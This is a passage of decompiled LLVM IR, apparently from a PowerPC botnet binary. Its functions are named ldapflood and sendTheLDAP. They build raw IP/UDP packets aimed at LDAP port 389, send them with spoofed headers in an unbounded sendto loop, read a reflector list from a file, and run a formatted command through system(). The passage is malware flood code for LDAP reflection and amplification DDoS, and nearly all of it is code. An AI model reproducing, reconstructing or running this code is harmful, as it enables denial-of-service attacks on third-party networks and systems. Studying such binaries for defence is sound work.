  store i32 %v1_10006c34, i32* %r9.global-to-local, align 4
  %v2_10007250 = icmp ult i32 %v1_10007238, %v2_1000724c
  br i1 %v2_10007250, label %dec_label_pc_10007260, label %dec_label_pc_10007258

dec_label_pc_10007258:                            ; preds = %dec_label_pc_10007234
  %v0_1000725c = call i32 @__GI_exit()
  br label %dec_label_pc_10007260

dec_label_pc_10007260:                            ; preds = %dec_label_pc_10007234, %dec_label_pc_10007258
  br label %dec_label_pc_10007268

dec_label_pc_10007268:                            ; preds = %dec_label_pc_10007228, %dec_label_pc_10007260
  %stack_var_-1120.1 = phi i32 [ %stack_var_-1120.0, %dec_label_pc_10007228 ], [ 0, %dec_label_pc_10007260 ]
  store i32 %stack_var_-1120.1, i32* %r9.global-to-local, align 4
  %v1_1000726c = add i32 %stack_var_-1120.1, 1
  br label %dec_label_pc_10007228

dec_label_pc_10007278:                            ; preds = %dec_label_pc_10007104
  %v0_1000727c = call i32 @__GI_exit()
  br label %dec_label_pc_10007280

dec_label_pc_10007280:                            ; preds = %entry, %dec_label_pc_10006c30, %dec_label_pc_10007278
  %v0_100072ac = phi i32 [ %v1_10006bc8, %entry ], [ %v0_10006c60, %dec_label_pc_10006c30 ], [ %v0_1000727c, %dec_label_pc_10007278 ]
  %v2_10007280 = load i32, i32* %stack_var_-1168, align 4
  store i32 %v5_10006b90, i32* %r9.global-to-local, align 4
  store i32 %v2_10007280, i32* %r11.global-to-local, align 4
  ret i32 %v0_100072ac

; uselistorder directives
  uselistorder i32 %stack_var_-1120.1, { 1, 0 }
  uselistorder i32 %v3_10007198, { 1, 0, 2 }
  uselistorder i32 %v1_100070ec, { 1, 0 }
  uselistorder i32 %v2_10007058, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge15, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-1128.0.ph, { 1, 0 }
  uselistorder i32 %v3_10006ed0, { 1, 0, 2 }
  uselistorder i32 %v3_10006ebc, { 1, 0 }
  uselistorder i32 %v1_10006d6c, { 4, 3, 1, 2, 5, 0 }
  uselistorder i32 %v0_10006d50, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10006cc0, { 1, 0, 2 }
  uselistorder i32 %v2_10006cb0, { 1, 0 }
  uselistorder i32 %v1_10006c6c, { 2, 1, 0, 3 }
  uselistorder i32* %v1_10006c58, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_10006c54, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32 %v1_10006c34, { 1, 0 }
  uselistorder i32* %stack_var_-1168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 19, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007280, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007268, { 1, 0 }
  uselistorder label %dec_label_pc_10007260, { 1, 0 }
  uselistorder label %dec_label_pc_1000721c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000704c, { 1, 0 }
  uselistorder label %dec_label_pc_10006f54, { 1, 0 }
  uselistorder label %dec_label_pc_10006c30, { 1, 0 }
  uselistorder label %dec_label_pc_10006c04, { 1, 0 }
}

define i32 @setup_ldap_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100072d4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100072d4, i32* %arg1, align 4
  %v1_100072e8 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100072e8, i32* %arg1, align 4
  %v3_100072f8 = add i32 %tmp, 1
  %v4_100072f8 = inttoptr i32 %v3_100072f8 to i8*
  store i8 0, i8* %v4_100072f8, align 1
  %v3_10007304 = add i32 %tmp, 2
  %v4_10007304 = inttoptr i32 %v3_10007304 to i16*
  store i16 79, i16* %v4_10007304, align 2
  store i32 54321, i32* @r3, align 4
  %v1_10007310 = call i32 @htonl(i32 54321)
  %v1_10007320 = trunc i32 %v1_10007310 to i16
  %v3_10007320 = add i32 %tmp, 4
  %v4_10007320 = inttoptr i32 %v3_10007320 to i16*
  store i16 %v1_10007320, i16* %v4_10007320, align 2
  %v3_1000732c = add i32 %tmp, 6
  %v4_1000732c = inttoptr i32 %v3_1000732c to i16*
  store i16 0, i16* %v4_1000732c, align 2
  %v3_10007338 = add i32 %tmp, 8
  %v4_10007338 = inttoptr i32 %v3_10007338 to i8*
  store i8 -1, i8* %v4_10007338, align 1
  %v3_10007344 = add i32 %tmp, 9
  %v4_10007344 = inttoptr i32 %v3_10007344 to i8*
  store i8 17, i8* %v4_10007344, align 1
  %v3_10007350 = add i32 %tmp, 10
  %v4_10007350 = inttoptr i32 %v3_10007350 to i16*
  store i16 0, i16* %v4_10007350, align 2
  store i32 268464992, i32* @lr, align 4
  %v2_1000735c = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_1002a5b8.100 to i32))
  %v2_10007368 = add i32 %tmp, 12
  %v3_10007368 = inttoptr i32 %v2_10007368 to i32*
  store i32 %v2_1000735c, i32* %v3_10007368, align 4
  ret i32 %v2_1000735c
}

define i32 @setup_ldap_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 5678, i32* @r3, align 4
  %v1_100073a0 = call i32 @htons(i32 5678)
  %sext = mul i32 %v1_100073a0, 65536
  %v1_100073a4 = sdiv i32 %sext, 65536
  %v1_100073ac = trunc i32 %v1_100073a4 to i16
  store i16 %v1_100073ac, i16* %arg1, align 2
  store i32 389, i32* @r3, align 4
  %v1_100073b4 = call i32 @htons(i32 389)
  %v1_100073c0 = trunc i32 %v1_100073b4 to i16
  %v3_100073c0 = add i32 %tmp, 2
  %v4_100073c0 = inttoptr i32 %v3_100073c0 to i16*
  store i16 %v1_100073c0, i16* %v4_100073c0, align 2
  %v3_100073cc = add i32 %tmp, 6
  %v4_100073cc = inttoptr i32 %v3_100073cc to i16*
  store i16 0, i16* %v4_100073cc, align 2
  %v1_100073d4 = add i32 %tmp, 8
  store i32 %v1_100073d4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002ae60.317 to i32), i32* @r4, align 4
  store i32 51, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100073f8.318 to i32), i32* @lr, align 4
  %v0_100073f4 = call i32 @memcpy()
  store i32 59, i32* @r3, align 4
  %v1_100073fc = call i32 @htons(i32 59)
  %v2_100073fc = trunc i32 %v1_100073fc to i16
  %v3_10007408 = add i32 %tmp, 4
  %v4_10007408 = inttoptr i32 %v3_10007408 to i16*
  store i16 %v2_100073fc, i16* %v4_10007408, align 2
  ret i32 %v1_100073fc

; uselistorder directives
  uselistorder i32 5678, { 0, 3, 1, 4, 2, 5 }
}

define i32 @ldapflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_10007444 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_10007450 = add i32 %v2_10007444, 20
  %v5_10007454 = inttoptr i32 %v1_10007450 to i16*
  %v1_10007460 = add i32 %arg1, 12
  %v2_10007460 = inttoptr i32 %v1_10007460 to i32*
  %v3_10007460 = load i32, i32* %v2_10007460, align 4
  %v1_10007480 = add i32 %arg1, 4
  %v2_10007480 = inttoptr i32 %v1_10007480 to i32*
  %v3_10007480 = load i32, i32* %v2_10007480, align 4
  store i32 268465304, i32* @lr, align 4
  %v3_10007494 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_10007494, -1
  br i1 %tmp26, label %dec_label_pc_100074b4, label %dec_label_pc_100074ac

dec_label_pc_100074ac:                            ; preds = %entry
  %v0_100074b0 = call i32 @__GI_exit()
  br label %dec_label_pc_100074b4

dec_label_pc_100074b4:                            ; preds = %entry, %dec_label_pc_100074ac
  store i32 268465340, i32* @lr, align 4
  %v1_100074b8 = call i32 @__GI_time(i32 0)
  %v1_100074c4 = call i32 @init_rand(i32 %v1_100074b8)
  store i32 %v2_10007444, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268465376, i32* @lr, align 4
  %v0_100074dc = call i32 @__GI_memset()
  store i32 268465384, i32* @lr, align 4
  %v2_100074e4 = call i32 @setup_ldap_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268465392, i32* @lr, align 4
  %v2_100074ec = call i32 @setup_ldap_udp_header(i16* %v5_10007454)
  store i32 268465396, i32* @lr, align 4
  %v0_100074f0 = call i32 @random()
  %v2_10007510 = srem i32 %v0_100074f0, 65535
  %fold = add nsw i32 %v2_10007510, 64510
  %v1_1000753c = urem i32 %fold, 65536
  store i32 %v1_1000753c, i32* @r3, align 4
  %v1_10007544 = call i32 @htons(i32 %v1_1000753c)
  %v1_10007550 = trunc i32 %v1_10007544 to i16
  store i16 %v1_10007550, i16* %v5_10007454, align 4
  %v2_1000755c = add i32 %v2_10007444, 12
  %v3_1000755c = inttoptr i32 %v2_1000755c to i32*
  store i32 %v3_10007460, i32* %v3_1000755c, align 4
  %v1_10007564 = add i32 %v3_10007480, 4
  %v2_10007564 = inttoptr i32 %v1_10007564 to i32*
  %v3_10007564 = load i32, i32* %v2_10007564, align 4
  %v2_1000756c = add i32 %v2_10007444, 16
  %v3_1000756c = inttoptr i32 %v2_1000756c to i32*
  store i32 %v3_10007564, i32* %v3_1000756c, align 4
  %v1_10007578 = or i32 %v2_10007444, 2
  %v2_10007578 = inttoptr i32 %v1_10007578 to i16*
  %v3_10007578 = load i16, i16* %v2_10007578, align 2
  %div = udiv i16 %v3_10007578, 2
  %v1_10007580 = zext i16 %div to i32
  %v2_10007590 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10007590 = call i32 @csum(i16* %v2_10007590, i32 %v1_10007580)
  %v1_1000759c = trunc i32 %v3_10007590 to i16
  %v3_1000759c = add i32 %v2_10007444, 10
  %v4_1000759c = inttoptr i32 %v3_1000759c to i16*
  store i16 %v1_1000759c, i16* %v4_1000759c, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_100075a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268465608, i32* @lr, align 4
  %v5_100075c4 = call i32 @__GI_setsockopt(i32 %v3_10007494, i32 0, i32 3, i32 %v2_100075a8, i32 4)
  %tmp28 = icmp sgt i32 %v5_100075c4, -1
  br i1 %tmp28, label %dec_label_pc_100075dc, label %dec_label_pc_100075d4

dec_label_pc_100075d4:                            ; preds = %dec_label_pc_100074b4
  %v0_100075d8 = call i32 @__GI_exit()
  br label %dec_label_pc_100075dc

dec_label_pc_100075dc:                            ; preds = %dec_label_pc_100074b4, %dec_label_pc_100075d4
  store i32 268465636, i32* @lr, align 4
  %v1_100075e0 = call i32 @__GI_time(i32 0)
  %v1_100075ec = call i32 @init_rand(i32 %v1_100075e0)
  %v3_10007668 = add i32 %v2_10007444, 4
  %v4_10007668 = inttoptr i32 %v3_10007668 to i16*
  br label %dec_label_pc_100075f8

dec_label_pc_100075f8:                            ; preds = %dec_label_pc_100076dc, %dec_label_pc_100075dc
  %stack_var_-4160.0 = phi i32 [ %v3_10007480, %dec_label_pc_100075dc ], [ %v3_10007634, %dec_label_pc_100076dc ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_100075dc ], [ %v1_100076e0, %dec_label_pc_100076dc ]
  %v3_100075fc = load i16, i16* %v2_10007578, align 2
  %v4_100075fc = zext i16 %v3_100075fc to i32
  store i32 268465712, i32* @lr, align 4
  %v6_1000762c = call i32 @sendto(i32 %v3_10007494, i32 %v2_10007444, i32 %v4_100075fc, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_10007634 = add i32 %stack_var_-4160.0, 532
  %v2_10007634 = inttoptr i32 %v1_10007634 to i32*
  %v3_10007634 = load i32, i32* %v2_10007634, align 4
  %v1_10007640 = add i32 %v3_10007634, 4
  %v2_10007640 = inttoptr i32 %v1_10007640 to i32*
  %v3_10007640 = load i32, i32* %v2_10007640, align 4
  store i32 %v3_10007640, i32* %v3_1000756c, align 4
  %v0_1000764c = call i32 @rand_cmwc()
  store i32 %v0_1000764c, i32* @r3, align 4
  %v1_10007658 = call i32 @htonl(i32 %v0_1000764c)
  %v1_10007668 = trunc i32 %v1_10007658 to i16
  store i16 %v1_10007668, i16* %v4_10007668, align 4
  %v3_10007674 = load i16, i16* %v2_10007578, align 2
  %div29 = udiv i16 %v3_10007674, 2
  %v1_1000767c = zext i16 %div29 to i32
  %v3_1000768c = call i32 @csum(i16* %v2_10007590, i32 %v1_1000767c)
  %v1_10007698 = trunc i32 %v3_1000768c to i16
  store i16 %v1_10007698, i16* %v4_1000759c, align 2
  %v3_100076a0 = load i32, i32* @global_var_1004518c.119, align 4
  %v1_100076a4 = add i32 %v3_100076a0, 1
  store i32 %v1_100076a4, i32* @global_var_1004518c.119, align 4
  %v3_100076b4 = load i32, i32* @global_var_10045174.120, align 4
  %v3_100076bc = icmp ugt i32 %v3_100076b4, %storemerge4
  br i1 %v3_100076bc, label %dec_label_pc_100076dc, label %dec_label_pc_100076c4

dec_label_pc_100076c4:                            ; preds = %dec_label_pc_100075f8
  %v3_100076d0 = load i32, i32* @global_var_100450b4.121, align 4
  store i32 268465884, i32* @lr, align 4
  %v1_100076d8 = call i32 @usleep(i32 %v3_100076d0)
  br label %dec_label_pc_100076dc

dec_label_pc_100076dc:                            ; preds = %dec_label_pc_100075f8, %dec_label_pc_100076c4
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_100075f8 ], [ 0, %dec_label_pc_100076c4 ]
  %v1_100076e0 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_100075f8

; uselistorder directives
  uselistorder i32 %v3_10007634, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_1000753c, { 1, 0 }
  uselistorder i32 %v2_10007444, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100076dc, { 1, 0 }
  uselistorder label %dec_label_pc_100075dc, { 1, 0 }
  uselistorder label %dec_label_pc_100074b4, { 1, 0 }
}

define i32 @sendTheLDAP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100076ec = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100076ec, i32* %stack_var_-1168, align 4
  %v5_100076ec = ptrtoint i32* %stack_var_-1168 to i32
  %v1_10007724 = call i32 @mfork(i32 %arg2)
  %v3_1000772c = icmp eq i32 %v1_10007724, 0
  br i1 %v3_1000772c, label %dec_label_pc_10007734, label %dec_label_pc_10007ddc

dec_label_pc_10007734:                            ; preds = %entry
  store i32 268465988, i32* @lr, align 4
  %v3_10007740 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp40 = icmp sgt i32 %v3_10007740, -1
  br i1 %tmp40, label %dec_label_pc_10007760, label %dec_label_pc_10007758

dec_label_pc_10007758:                            ; preds = %dec_label_pc_10007734
  %v0_1000775c = call i32 @__GI_exit()
  br label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_10007734, %dec_label_pc_10007758
  %v2_10007764 = icmp sgt i32 %arg3, 5
  br i1 %v2_10007764, label %dec_label_pc_1000778c, label %dec_label_pc_1000776c

dec_label_pc_1000776c:                            ; preds = %dec_label_pc_10007760
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10007780 = call i32 @Send(i32 %arg1, i32 ptrtoint ([113 x i8]* @global_var_1002ae94.322 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10007788 = call i32 @__GI_exit()
  br label %dec_label_pc_1000778c

dec_label_pc_1000778c:                            ; preds = %dec_label_pc_10007760, %dec_label_pc_1000776c
  store i32 268466068, i32* @lr, align 4
  %v1_10007790 = call i32 @__GI_time(i32 0)
  %v1_100077a0 = add i32 %arg4, 24
  store i32 %v1_100077a0, i32* %r9.global-to-local, align 4
  %v1_100077a4 = inttoptr i32 %v1_100077a0 to i32*
  %v2_100077a4 = load i32, i32* %v1_100077a4, align 4
  %v1_100077b0 = add i32 %arg4, 12
  store i32 %v1_100077b0, i32* %r9.global-to-local, align 4
  %v1_100077b4 = inttoptr i32 %v1_100077b0 to i32*
  %v2_100077b4 = load i32, i32* %v1_100077b4, align 4
  store i32 %v2_100077b4, i32* @r3, align 4
  %v0_100077bc = call i32 @__GI_strlen()
  %v1_100077c4 = mul i32 %v0_100077bc, 5
  store i32 %v1_100077c4, i32* %r9.global-to-local, align 4
  %v1_100077c8 = add i32 %v1_100077c4, 160
  %v2_100077d4 = icmp sgt i32 %v1_100077c8, 1023
  br i1 %v2_100077d4, label %dec_label_pc_10007ddc, label %dec_label_pc_100077dc

dec_label_pc_100077dc:                            ; preds = %dec_label_pc_1000778c
  store i32 %v1_100077b0, i32* %r9.global-to-local, align 4
  %v2_100077e8 = load i32, i32* %v1_100077b4, align 4
  store i32 %v1_100077b0, i32* %r9.global-to-local, align 4
  %v2_100077f4 = load i32, i32* %v1_100077b4, align 4
  store i32 %v1_100077b0, i32* %r9.global-to-local, align 4
  %v2_10007800 = load i32, i32* %v1_100077b4, align 4
  store i32 %v1_100077b0, i32* %r9.global-to-local, align 4
  %v2_1000780c = load i32, i32* %v1_100077b4, align 4
  store i32 %v1_100077b0, i32* %r9.global-to-local, align 4
  %v2_10007818 = load i32, i32* %v1_100077b4, align 4
  store i32 %v2_10007818, i32* %r11.global-to-local, align 4
  %v2_1000781c = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_1000781c, i32* @r3, align 4
  store i32 %v1_100077c8, i32* @r4, align 4
  store i32 ptrtoint ([176 x i8]* @global_var_1002af08.325 to i32), i32* @r5, align 4
  store i32 %v2_1000780c, i32* %r9.global-to-local, align 4
  store i32 268466248, i32* @lr, align 4
  %v9_10007844 = call i32 @__GI_snprintf(i32 %v2_1000781c, i32 %v1_100077c8, i32 ptrtoint ([176 x i8]* @global_var_1002af08.325 to i32), i32 %v2_100077e8, i32 %v2_100077f4, i32 %v2_10007800, i32 %v2_1000780c, i32 %v1_100077c8)
  store i32 ptrtoint ([3 x i8]* @global_var_10007854.326 to i32), i32* @lr, align 4
  %v1_10007850 = call i32 @system(i32 %v2_1000781c)
  store i32 268466268, i32* @lr, align 4
  %v1_10007858 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10007868.327 to i32), i32* @lr, align 4
  %v1_10007864 = call i32 @srand(i32 %v1_10007858)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045194.105, align 4
  store i32 128, i32* @r3, align 4
  store i32 268466320, i32* @lr, align 4
  %v0_1000788c = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_1000788c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268466352, i32* @lr, align 4
  %v0_100078ac = call i32 @__GI_memset()
  %v1_100078bc = add i32 %arg4, 16
  store i32 %v1_100078bc, i32* %r9.global-to-local, align 4
  %v1_100078c0 = inttoptr i32 %v1_100078bc to i32*
  %v2_100078c0 = load i32, i32* %v1_100078c0, align 4
  store i32 268466380, i32* @lr, align 4
  %v1_100078c8 = call i32 @atol(i32 %v2_100078c0)
  %v1_100078d8 = add i32 %arg4, 20
  store i32 %v1_100078d8, i32* %r9.global-to-local, align 4
  %v1_100078dc = inttoptr i32 %v1_100078d8 to i32*
  %v2_100078dc = load i32, i32* %v1_100078dc, align 4
  store i32 268466408, i32* @lr, align 4
  %v1_100078e4 = call i32 @atol(i32 %v2_100078dc)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268466468, i32* @lr, align 4
  %v3_10007920 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_1002afb8.328 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6e0.110 to i32))
  %v2_10007944 = add i32 %v0_100078ac, -1
  br label %dec_label_pc_10007abc.outer

dec_label_pc_10007930:                            ; preds = %dec_label_pc_10007abc
  store i32 %v0_100078ac, i32* @r3, align 4
  %v0_10007934 = call i32 @__GI_strlen()
  %v1_10007948 = add i32 %v0_10007934, %v2_10007944
  store i32 %v1_10007948, i32* %r9.global-to-local, align 4
  %v1_1000794c = inttoptr i32 %v1_10007948 to i8*
  %v2_1000794c = load i8, i8* %v1_1000794c, align 1
  %v3_10007954 = icmp eq i8 %v2_1000794c, 10
  br i1 %v3_10007954, label %dec_label_pc_10007988, label %dec_label_pc_1000795c

dec_label_pc_1000795c:                            ; preds = %dec_label_pc_10007930
  store i32 %v0_100078ac, i32* @r3, align 4
  %v0_10007960 = call i32 @__GI_strlen()
  %v1_10007974 = add i32 %v0_10007960, %v2_10007944
  store i32 %v1_10007974, i32* %r9.global-to-local, align 4
  %v1_10007978 = inttoptr i32 %v1_10007974 to i8*
  %v2_10007978 = load i8, i8* %v1_10007978, align 1
  %v3_10007980 = icmp eq i8 %v2_10007978, 13
  br i1 %v3_10007980, label %dec_label_pc_10007988, label %dec_label_pc_10007abc

dec_label_pc_10007988:                            ; preds = %dec_label_pc_1000795c, %dec_label_pc_10007930
  store i32 %v0_100078ac, i32* @r3, align 4
  %v0_1000798c = call i32 @__GI_strlen()
  %v1_100079a0 = add i32 %v0_1000798c, %v2_10007944
  %v3_100079a8 = inttoptr i32 %v1_100079a0 to i8*
  store i8 0, i8* %v3_100079a8, align 1
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100079b0 = load i32, i32* @global_var_10045194.105, align 4
  %v3_100079b4 = icmp eq i32 %v3_100079b0, 0
  store i32 540, i32* @r3, align 4
  br i1 %v3_100079b4, label %dec_label_pc_100079bc, label %dec_label_pc_10007a40

dec_label_pc_100079bc:                            ; preds = %dec_label_pc_10007988
  store i32 268466628, i32* @lr, align 4
  %v0_100079c0 = call i32 @malloc()
  store i32 %v0_100079c0, i32* @global_var_10045194.105, align 4
  store i32 %v0_100079c0, i32* %r9.global-to-local, align 4
  %v2_100079e0 = inttoptr i32 %v0_100079c0 to i32*
  store i32 0, i32* %v2_100079e0, align 4
  %v1_100079e8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100079e8 = add i32 %v1_100079e8, 4
  %v3_100079e8 = inttoptr i32 %v2_100079e8 to i32*
  store i32 0, i32* %v3_100079e8, align 4
  %v1_100079f0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100079f0 = add i32 %v1_100079f0, 8
  %v3_100079f0 = inttoptr i32 %v2_100079f0 to i32*
  store i32 0, i32* %v3_100079f0, align 4
  %v1_100079f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100079f8 = add i32 %v1_100079f8, 12
  %v3_100079f8 = inttoptr i32 %v2_100079f8 to i32*
  store i32 0, i32* %v3_100079f8, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10007a00 = load i32, i32* @global_var_10045194.105, align 4
  store i32 268466700, i32* @lr, align 4
  %v1_10007a08 = call i32 @inet_addr(i32 %v0_100078ac)
  %v2_10007a10 = add i32 %v3_10007a00, 4
  %v3_10007a10 = inttoptr i32 %v2_10007a10 to i32*
  store i32 %v1_10007a08, i32* %v3_10007a10, align 4
  %v3_10007a18 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10007a24 = add i32 %v3_10007a18, 532
  %v3_10007a24 = inttoptr i32 %v2_10007a24 to i32*
  store i32 %v3_10007a18, i32* %v3_10007a24, align 4
  %v3_10007a2c = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10007a2c, i32* %r11.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10007a38 = add i32 %v3_10007a2c, 536
  %v3_10007a38 = inttoptr i32 %v2_10007a38 to i32*
  store i32 %v3_10007a2c, i32* %v3_10007a38, align 4
  br label %dec_label_pc_10007ab0

dec_label_pc_10007a40:                            ; preds = %dec_label_pc_10007988
  store i32 268466760, i32* @lr, align 4
  %v0_10007a44 = call i32 @malloc()
  store i32 540, i32* %r9.global-to-local, align 4
  store i32 %v0_10007a44, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 540, i32* @r5, align 4
  store i32 268466792, i32* @lr, align 4
  %v0_10007a64 = call i32 @__GI_memset()
  store i32 268466800, i32* @lr, align 4
  %v1_10007a6c = call i32 @inet_addr(i32 %v0_100078ac)
  %v2_10007a78 = add i32 %v0_10007a44, 4
  %v3_10007a78 = inttoptr i32 %v2_10007a78 to i32*
  store i32 %v1_10007a6c, i32* %v3_10007a78, align 4
  %v3_10007a80 = load i32, i32* @global_var_10045194.105, align 4
  %v2_10007a88 = add i32 %v0_10007a44, 536
  %v3_10007a88 = inttoptr i32 %v2_10007a88 to i32*
  store i32 %v3_10007a80, i32* %v3_10007a88, align 4
  %v3_10007a90 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10007a90, i32* %r9.global-to-local, align 4
  %v1_10007a94 = add i32 %v3_10007a90, 532
  %v2_10007a94 = inttoptr i32 %v1_10007a94 to i32*
  %v3_10007a94 = load i32, i32* %v2_10007a94, align 4
  %v2_10007a9c = add i32 %v0_10007a44, 532
  %v3_10007a9c = inttoptr i32 %v2_10007a9c to i32*
  store i32 %v3_10007a94, i32* %v3_10007a9c, align 4
  %v3_10007aa4 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10007aa4, i32* %r9.global-to-local, align 4
  %v2_10007aac = add i32 %v3_10007aa4, 532
  %v3_10007aac = inttoptr i32 %v2_10007aac to i32*
  store i32 %v0_10007a44, i32* %v3_10007aac, align 4
  br label %dec_label_pc_10007ab0

dec_label_pc_10007ab0:                            ; preds = %dec_label_pc_100079bc, %dec_label_pc_10007a40
  store i32 %stack_var_-1128.0.ph, i32* %r9.global-to-local, align 4
  %v1_10007ab4 = add i32 %stack_var_-1128.0.ph, 1
  br label %dec_label_pc_10007abc.outer

dec_label_pc_10007abc.outer:                      ; preds = %dec_label_pc_10007ab0, %dec_label_pc_100077dc
  %stack_var_-1128.0.ph = phi i32 [ %v1_10007ab4, %dec_label_pc_10007ab0 ], [ 0, %dec_label_pc_100077dc ]
  br label %dec_label_pc_10007abc

dec_label_pc_10007abc:                            ; preds = %dec_label_pc_10007abc.outer, %dec_label_pc_1000795c
  store i32 268466892, i32* @lr, align 4
  %v3_10007ac8 = call i32 @fgets(i32 %v0_100078ac, i32 128, i32 %v3_10007920)
  %v3_10007ad0 = icmp eq i32 %v3_10007ac8, 0
  br i1 %v3_10007ad0, label %dec_label_pc_10007ad8, label %dec_label_pc_10007930

dec_label_pc_10007ad8:                            ; preds = %dec_label_pc_10007abc
  %v3_10007adc = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_10007adc, i32* %r9.global-to-local, align 4
  %v1_10007ae0 = add i32 %v3_10007adc, 532
  %v2_10007ae0 = inttoptr i32 %v1_10007ae0 to i32*
  %v3_10007ae0 = load i32, i32* %v2_10007ae0, align 4
  %v1_10007aec = mul i32 %v1_100078c8, 4
  %v1_10007af4 = add i32 %v1_10007aec, 30
  %v1_10007af8 = and i32 %v1_10007af4, -16
  %v2_10007b00 = load i32, i32* %stack_var_-1168, align 4
  %v1_10007b08 = load i32, i32* @r1, align 4
  %v3_10007b08 = sub i32 %v1_10007b08, %v1_10007af8
  %v4_10007b08 = inttoptr i32 %v3_10007b08 to i32*
  store i32 %v2_10007b00, i32* %v4_10007b08, align 4
  %v1_10007b18 = add i32 %v3_10007b08, 23
  %v1_10007b1c = and i32 %v1_10007b18, -16
  %v1_10007b3c = add i32 %arg4, 4
  store i32 %v1_10007b3c, i32* %r9.global-to-local, align 4
  %v1_10007b40 = inttoptr i32 %v1_10007b3c to i32*
  %v2_10007b40 = load i32, i32* %v1_10007b40, align 4
  store i32 268467020, i32* @lr, align 4
  %v1_10007b48 = call i32 @inet_addr(i32 %v2_10007b40)
  %v1_10007b58 = mul i32 %v1_100078c8, 24
  %v1_10007b5c = add i32 %v1_10007b58, 15
  store i32 %v1_10007b5c, i32* %r9.global-to-local, align 4
  %v1_10007b60 = add i32 %v1_10007b58, 30
  %v1_10007b64 = and i32 %v1_10007b60, -16
  %v0_10007b6c = load i32, i32* @r1, align 4
  %v1_10007b6c = inttoptr i32 %v0_10007b6c to i32*
  %v2_10007b6c = load i32, i32* %v1_10007b6c, align 4
  %v3_10007b74 = sub i32 %v0_10007b6c, %v1_10007b64
  %v4_10007b74 = inttoptr i32 %v3_10007b74 to i32*
  store i32 %v2_10007b6c, i32* %v4_10007b74, align 4
